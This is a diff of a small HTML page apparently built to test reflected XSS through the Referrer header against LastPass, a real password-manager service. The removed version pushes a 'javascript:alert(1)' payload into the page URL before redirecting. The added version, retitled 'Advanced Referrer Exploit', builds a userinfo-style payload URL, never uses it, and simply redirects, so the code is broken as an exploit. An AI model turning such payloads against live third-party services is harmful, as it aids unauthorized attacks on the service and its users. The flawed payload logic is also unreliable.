@@ -2,37 +2,25 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>XSS Referrer Lab</title>
+    <meta name="referrer" content="unsafe-url">
+    <title>Advanced Referrer Exploit</title>
 </head>
 <body>
 
-    <h2>Security Research: Referrer Reflection Test</h2>
-    <p>Clicking the button will simulate a transition from a malicious path to the target.</p>
+    <h2>Target: LastPass (Cookie Reflection)</h2>
+    <p>Attempting to reflect payload via UserInfo sub-component.</p>
     
-    <button id="startTest">Execute Test</button>
+    <button id="exploitBtn">Click to Exploit</button>
 
     <script>
-        document.getElementById('startTest').addEventListener('click', function() {
-            // 1. We define the target URL
-            const targetSite = "https://www.lastpass.com";
-
-            // 2. We define the payload that we want to appear in the Referrer
-            const payload = "javascript:alert(1)";
-
-            /* 
-               IMPORTANT: To make the browser send this in the Referrer header, 
-               the current URL must contain this string.
-               
-               We use 'history.pushState' to change the URL in the address bar 
-               WITHOUT reloading the page, then we redirect.
-            */
+        document.getElementById('exploitBtn').addEventListener('click', function() {
+            // The payload is placed BEFORE the @ symbol
+            // Some parsers will include this in the "Origin" reflected in the cookie
+            const maliciousUrl = "https://javascript:alert(1)@your-domain.com/";
             
-            history.pushState({}, '', '/' + payload);
-
-            // 3. Small delay to ensure the state is pushed, then redirect
-            setTimeout(function() {
-                window.location.href = targetSite;
-            }, 500);
+            // Redirecting to the target
+            // We hope the target's cookie logic captures the UserInfo part
+            window.location.href = "https://www.lastpass.com";
         });
     </script>
 
